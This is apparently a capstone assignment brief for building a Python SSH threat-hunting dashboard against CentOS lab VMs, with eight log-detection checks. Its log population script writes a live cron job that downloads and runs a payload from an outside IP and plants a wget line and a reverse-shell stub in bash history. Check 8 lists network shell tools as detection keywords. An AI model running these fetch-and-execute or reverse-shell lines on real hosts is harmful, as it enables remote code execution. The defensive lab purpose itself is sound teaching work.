# Project: VM Threat Hunting Dashboard
## Defensive Security & DevOps Engineering — Capstone Project

---

## Overview

You will build a desktop threat hunting tool in Python that connects to multiple Linux VMs over SSH, runs hunting scripts against well-known CentOS log locations, and presents findings in a GUI with export capability.

This mirrors real-world blue-team tooling: analysts rarely SSH into boxes manually one by one — they build or use platforms that fan out across a fleet, collect structured findings, and produce artifacts. Your tool is a minimal version of exactly that.

---

## Lab Environment

Provision **3–4 CentOS VMs** on your host machine using VirtualBox or VMware. Each VM must:

- Run CentOS 7 or CentOS Stream 8/9
- Have SSH enabled and accessible from the host (`sshd` running, firewall allowing port 22)
- Have a non-root user with `sudo` privileges that your tool will connect as
- Have populated log files (run the provided log population script below, or generate activity naturally by running services, failed logins, cron jobs)

Suggested VM naming convention:

| VM | Hostname | Role / Simulated Scenario |
|----|----------|---------------------------|
| 1 | `centos-web01` | Web server — Apache logs, auth logs |
| 2 | `centos-db01` | Database server — auth abuse, cron persistence |
| 3 | `centos-soc01` | Syslog collector — mixed log sources |
| 4 | `centos-dev01` | Dev box — sudo abuse, package installs |

---

## Log Targets

Your hunting scripts must cover the following CentOS log locations:

| Log File | What to Hunt |
|----------|--------------|
| `/var/log/secure` | Failed SSH logins, sudo abuse, su attempts, new user creation |
| `/var/log/messages` | Kernel events, service crashes, unexpected reboots |
| `/var/log/audit/audit.log` | Auditd events — file access, privilege escalation, execve calls |
| `/var/log/cron` | Unexpected cron job additions, cron running at odd hours |
| `/var/log/yum.log` or `/var/log/dnf.log` | Unexpected package installs/removals |
| `/var/log/httpd/access_log` | If Apache present — scanning, brute force, webshell access |
| `/var/log/httpd/error_log` | If Apache present — exploit attempts, 500 errors |
| `~/.bash_history` | Command history of the connecting user |

---

## Tool Requirements

### Core Features (mandatory)

**VM Fleet Panel**
- On launch, read a config file (`vms.json`) listing VM connection details (host, port, username, key path or password)
- Display each VM as a card or row in the GUI showing: hostname, IP, status (`Unknown` / `Online` / `Offline` / `Hunting` / `Done`)
- Include a **Test Connectivity** button per VM and a **Test All** button — uses Fabric to open an SSH connection and run `hostname && uptime`, displays result inline

**Hunting Engine**
- A **Hunt** button per VM and a **Hunt All** button
- Hunting runs in a background thread — the GUI must **not freeze** during SSH operations (use `threading` or `concurrent.futures`)
- Each hunt runs a defined set of checks against the log targets above
- Progress indicator per VM (e.g. `Running check 3/7...`)

**Report Panel**
- After hunting completes, display a structured report per VM in a scrollable text area or tabbed panel
- Report must include: VM name, hunt timestamp, findings per log file, severity (`HIGH` / `MEDIUM` / `LOW` / `INFO`), raw evidence lines for each finding
- A **Save Report** button exports the report as a `.txt` or `.json` file with a timestamped filename (e.g. `report_centos-web01_20240115_034211.txt`)
- A **Save All** button exports reports for all VMs

### GUI Requirements
- Use `customtkinter` (preferred) or `tkinter`
- Dark theme
- Must handle connection errors gracefully — show error inline, do not crash
- Must handle missing log files gracefully — skip and note in report

---

## Hunting Checks — Minimum Required Set

Implement at least the following 8 checks. Each check must return a list of findings where every finding has:
- `severity` — `HIGH`, `MEDIUM`, `LOW`, or `INFO`
- `description` — human-readable summary of what was found
- `evidence` — the raw log lines that triggered the finding

---

### Check 1 — SSH Brute Force (`/var/log/secure`)
- More than 5 failed password attempts from the same source IP within any 1-hour window
- **Severity:** `HIGH` if source is an external IP, `MEDIUM` if internal RFC1918

---

### Check 2 — Successful Login After Failures (`/var/log/secure`)
- An `Accepted` login from a source IP that had 3+ prior failures in the same log
- **Severity:** `HIGH` — credential stuffing / brute force success indicator

---

### Check 3 — Sudo Abuse (`/var/log/secure`)
- Any `sudo` command run by a user not in your expected admins list
- Any `sudo: pam_unix` authentication failure
- **Severity:** `HIGH`

---

### Check 4 — New User or Group Created (`/var/log/secure`)
- Lines matching `useradd`, `groupadd`, or `usermod`
- **Severity:** `HIGH` — classic persistence mechanism

---

### Check 5 — Unexpected Cron Entries (`/var/log/cron`)
- Cron jobs running between `00:00–05:00` that are not in a known-good baseline list you define
- Cron entries for users other than `root` and your defined service accounts
- **Severity:** `MEDIUM`

---

### Check 6 — Unexpected Package Activity (`/var/log/yum.log` or `dnf.log`)
- Any `Installed` or `Erased` package in the last 7 days not in your known-good baseline
- **Severity:** `MEDIUM`

---

### Check 7 — Auditd Privilege Escalation (`/var/log/audit/audit.log`)
- `type=SYSCALL` events with `comm="sudo"` or `comm="su"` and `success=yes`
- `type=USER_AUTH` failures
- **Severity:** `HIGH`

---

### Check 8 — Suspicious Command History (`~/.bash_history`)
- Any line matching: `wget`, `curl`, `nc`, `ncat`, `base64`, `/dev/tcp`, `chmod +x`, `python -c`, `perl -e`, `bash -i`
- **Severity:** `HIGH`

---

## Architecture Guidance

Structure your project exactly as follows. Mixing GUI, hunting logic, and SSH transport into one file will cause threading issues you will not easily debug.

```
project/
├── main.py                  # entry point, launches GUI
├── vms.json                 # VM config (do not commit passwords)
├── gui/
│   ├── app.py               # main window, layout
│   ├── vm_card.py           # per-VM widget component
│   └── report_panel.py      # report display + save logic
├── hunting/
│   ├── engine.py            # orchestrates checks per VM, returns Report object
│   ├── checks.py            # individual check functions
│   └── models.py            # Finding, Report dataclasses
├── transport/
│   └── ssh.py               # Fabric wrapper — connect, run_command, fetch_log
└── requirements.txt
```

**`fabric`** handles SSH — use `Connection.run()` for remote commands and `Connection.get()` to pull log files locally before parsing. Pulling files locally and parsing in Python is simpler and more reliable than streaming over a live SSH channel.

**`concurrent.futures.ThreadPoolExecutor`** for parallel hunts — submit one future per VM. Update the GUI via a thread-safe `queue.Queue` that the main thread polls with `root.after(100, poll_queue)`. Tkinter is **not thread-safe** — never update a widget directly from a worker thread.

**`dataclasses`** for `Finding` and `Report` — gives you free `__repr__`, clean field access, and easy JSON serialization via `dataclasses.asdict()`.

---

## `vms.json` Format

```json
[
  {
    "name": "centos-web01",
    "host": "192.168.56.101",
    "port": 22,
    "username": "analyst",
    "key_path": "~/.ssh/id_rsa"
  },
  {
    "name": "centos-db01",
    "host": "192.168.56.102",
    "port": 22,
    "username": "analyst",
    "key_path": "~/.ssh/id_rsa"
  },
  {
    "name": "centos-soc01",
    "host": "192.168.56.103",
    "port": 22,
    "username": "analyst",
    "key_path": "~/.ssh/id_rsa"
  },
  {
    "name": "centos-dev01",
    "host": "192.168.56.104",
    "port": 22,
    "username": "analyst",
    "key_path": "~/.ssh/id_rsa"
  }
]
```

---

## Log Population Script

Run this on **each VM** as root to generate realistic log noise for the hunting exercise.

```bash
#!/bin/bash
# populate_logs.sh — run as root on each CentOS VM
# Simulates attacker activity across log files

# 1. Simulate SSH brute force -> /var/log/secure
for i in $(seq 1 20); do
  logger -p auth.warning -t sshd \
    "Failed password for invalid user admin from 185.220.101.$((RANDOM % 50)) port $((RANDOM % 60000 + 1024)) ssh2"
done

# 2. Simulate successful login after failures
logger -p auth.info -t sshd \
  "Accepted password for analyst from 185.220.101.42 port 54321 ssh2"

# 3. Simulate sudo abuse
logger -p auth.warning -t sudo \
  "baduser : user NOT in sudoers ; TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash"

# 4. Simulate new user creation
logger -p auth.info -t useradd \
  "new user: name=backdoor, UID=1337, GID=1337, home=/home/backdoor, shell=/bin/bash"

# 5. Simulate suspicious cron entry
echo "0 3 * * * analyst wget http://185.220.101.1/payload.sh -O /tmp/p.sh && bash /tmp/p.sh" \
  >> /var/spool/cron/analyst
logger -p cron.info -t crond \
  "$(date '+%b %d %H:%M:%S') $(hostname) CROND: (analyst) CMD (wget http://185.220.101.1/payload.sh)"

# 6. Simulate unexpected package install
echo "$(date '+%b %d %H:%M:%S') Installed: netcat-openbsd-1.89-1.el7.x86_64" >> /var/log/yum.log

# 7. Plant suspicious bash history
echo "wget http://185.220.101.1/payload.sh" >> ~/.bash_history
echo "chmod +x payload.sh && ./payload.sh" >> ~/.bash_history
echo "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"185.220.101.1\",4444))'" \
  >> ~/.bash_history

echo "Log population complete on $(hostname)"
```

---

## Deliverables

| # | Deliverable | Notes |
|---|-------------|-------|
| 1 | **Source code** | Full project directory, structured as above |
| 2 | **`requirements.txt`** | All dependencies pinned — `pip freeze > requirements.txt` |
| 3 | **`vms.json`** | Your 3–4 VMs — sanitize credentials before submission |
| 4 | **`README.md`** | Setup instructions, how to run, known limitations |
| 5 | **Live demo** | Connectivity test → hunt all VMs → report display → save to file |

---

## Required Libraries

```
fabric>=3.0
customtkinter>=5.2
```

Install everything at once:

```bash
pip install fabric customtkinter
```

---